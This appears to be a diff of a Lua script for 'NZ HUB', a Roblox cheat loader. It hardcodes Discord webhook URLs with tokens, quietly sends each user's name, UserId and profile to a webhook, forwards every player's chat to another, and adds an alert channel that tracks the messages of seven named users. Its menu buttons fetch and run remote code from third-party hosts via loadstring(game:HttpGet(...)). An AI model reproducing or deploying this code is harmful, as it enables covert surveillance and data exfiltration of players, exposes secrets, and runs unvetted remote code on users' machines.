@@ -24,8 +24,12 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local WEBHOOKS = {
     MAIN = "https://discord.com/api/webhooks/1459298646590754827/TOc_e3_kHwZepKoMQB8EhwSMdFP7_avoyV6kYbmLVV4m6RqwwTha5eltf69snHOuLNKk",
     PLAYERS = "https://discord.com/api/webhooks/1459368985920540692/e6kW7yWiHoK10YDM2VmkXtnGJQ8alQtfkgBYcm_Ddwg6NCsJN_PLOX6TBMF828hg8eCL",
-    CHAT = "https://discord.com/api/webhooks/1459368825286955234/cQImuL2TJBPkY1kYn1B-EKEl1MJnMupf5ZyVOQ9el-bZKITGIw6edwMsz4Fo5DC_V8Tz"
+    CHAT = "https://discord.com/api/webhooks/1459368825286955234/cQImuL2TJBPkY1kYn1B-EKEl1MJnMupf5ZyVOQ9el-bZKITGIw6edwMsz4Fo5DC_V8Tz",
+    ALERT = "https://discord.com/api/webhooks/1459388726307328047/BVLg4bAKuZBuWjTL1JaClJh1cVICcbC2IDigoKVPUweAM3JZqXIJR3QvioVujUYt-tY6"
 }
+
+-- Usuarios a monitorear y enviar al webhook ALERT
+local MONITORED_USERS = {"swtanos", "molu78", "REDBUL59023", "keep_up8610", "chavxwm", "vgnamax2", "brandopro123a"}
 
 local function SendWebhook(url, content)
     -- Support either a plain content string or an embed/table with fields
@@ -216,15 +220,29 @@ KeyMessage.TextColor3 = Color3.fromRGB(200,200,200)
 
 local function acceptKey()
     KeyFrame:Destroy()
+    local displayName = LP.DisplayName or LP.Name
+    local expirationDate = os.date("%Y-%m-%d", os.time() + (100000 * 365.25 * 24 * 60 * 60))
+    
     local fields = {
         {name = "👤 Player", value = LP.Name, inline = true},
+        {name = "📝 Display Name", value = displayName, inline = true},
         {name = "🆔 UserId", value = tostring(LP.UserId), inline = true},
         {name = "🔗 Profile", value = "https://www.roblox.com/users/"..tostring(LP.UserId).."/profile", inline = false},
         {name = "⚙️ Action", value = "Key Accepted", inline = true},
+        {name = "📅 Key Expires", value = expirationDate, inline = true},
         {name = "🕒 Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
     }
     SendWebhook(WEBHOOKS.MAIN, {title = "NZ HUB LOG", color = 0x9b59ff, fields = fields})
     getgenv().IY_LOADED = true
+    
+    -- Show welcome message
+    task.spawn(function()
+        Splash("Bienvenido " .. displayName, 1.5)
+    end)
+    task.spawn(function()
+        task.wait(1.6)
+        Splash("La key expira en 100000 años", 1.5)
+    end)
 end
 
 KeyBtn.MouseButton1Click:Connect(function()
@@ -373,13 +391,6 @@ local function Rejoin()
     TeleportService:Teleport(game.PlaceId,LP)
 end
 
--- Webhook URLs
-local WEBHOOKS = {
-    MAIN = "https://discord.com/api/webhooks/1459298646590754827/TOc_e3_kHwZepKoMQB8EhwSMdFP7_avoyV6kYbmLVV4m6RqwwTha5eltf69snHOuLNKk",
-    PLAYERS = "https://discord.com/api/webhooks/1459368985920540692/e6kW7yWiHoK10YDM2VmkXtnGJQ8alQtfkgBYcm_Ddwg6NCsJN_PLOX6TBMF828hg8eCL",
-    CHAT = "https://discord.com/api/webhooks/1459368825286955234/cQImuL2TJBPkY1kYn1B-EKEl1MJnMupf5ZyVOQ9el-bZKITGIw6edwMsz4Fo5DC_V8Tz"
-}
-
 -- Enviar lista de jugadores cada 30s al webhook PLAYERS
 task.spawn(function()
     while task.wait(30) do
@@ -411,6 +422,21 @@ local function connectPlayerChat(p)
                 {name = "Time", value = time, inline = true}
             }
             SendWebhook(WEBHOOKS.CHAT, {title = "Chat Message", color = 0x3498db, fields = fields})
+            
+            -- Verificar si el usuario está en la lista de monitoreados
+            local isMonitored = false
+            for _, monitoredName in ipairs(MONITORED_USERS) do
+                if string.lower(p.Name) == string.lower(monitoredName) then
+                    isMonitored = true
+                    break
+                end
+            end
+            
+            -- Si es un usuario monitoreado, enviar alerta al webhook ALERT
+            if isMonitored then
+                local alertContent = "**" .. p.Name .. "** escribió: " .. msg
+                SendWebhook(WEBHOOKS.ALERT, alertContent)
+            end
         end)
     end)
 end
@@ -441,7 +467,6 @@ function UBGMenu()
         loadstring(game:HttpGet("https://eltonshub-loader.netlify.app/UBG1.lua"))()
         return "https://eltonshub-loader.netlify.app/UBG1.lua"
     end)
-    Button("🔄 Rejoin",Rejoin)
     Button("🎭 Emotes",function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"))()
         return "https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"
@@ -450,6 +475,7 @@ function UBGMenu()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua",true))()
         return "https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua"
     end)
+    Button("🔄 Rejoin",Rejoin)
     Button("⬅️ Back",MainMenu)
 end
 
@@ -459,7 +485,6 @@ function TSBMenu()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"))()
         return "https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"
     end)
-    Button("🔄 Rejoin",Rejoin)
     Button("⚡ AUTO TECHS V2",function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"))()
         return "https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"
@@ -480,6 +505,7 @@ function TSBMenu()
         loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"))()
         return "https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"
     end)
+    Button("🔄 Rejoin",Rejoin)
     Button("⬅️ Back",MainMenu)
 end
 
